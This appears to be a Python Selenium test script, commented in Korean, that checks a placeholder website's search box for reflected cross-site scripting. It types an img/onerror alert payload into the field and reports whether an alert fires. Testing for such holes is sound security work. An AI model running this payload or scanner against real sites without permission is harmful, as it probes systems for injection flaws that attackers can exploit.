# test_xss_frontend.py
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

def test_reflected_xss():
    """프론트엔드 XSS 테스트"""
    
    # Selenium으로 브라우저 제어
    driver = webdriver.Chrome()
    
    try:
        # 대상 서비스 접속
        driver.get("https://www.example-target.com/service")
        
        # 검색창 찾기
        search_input = driver.find_element(By.ID, "search-input")  # ID는 실제 확인 필요
        
        # XSS 페이로드 입력
        payload = "<img src=x onerror=alert('XSS')>"
        search_input.send_keys(payload)
        
        # 검색 버튼 클릭
        search_btn = driver.find_element(By.ID, "search-btn")
        search_btn.click()
        
        time.sleep(2)
        
        # alert 창 확인
        try:
            alert = driver.switch_to.alert
            print(f"⚠️  XSS 취약점 발견! Alert 메시지: {alert.text}")
            alert.accept()
            return True
        except:
            print("✓ XSS 취약점 없음")
            return False
            
    finally:
        driver.quit()

if __name__ == "__main__":
    test_reflected_xss()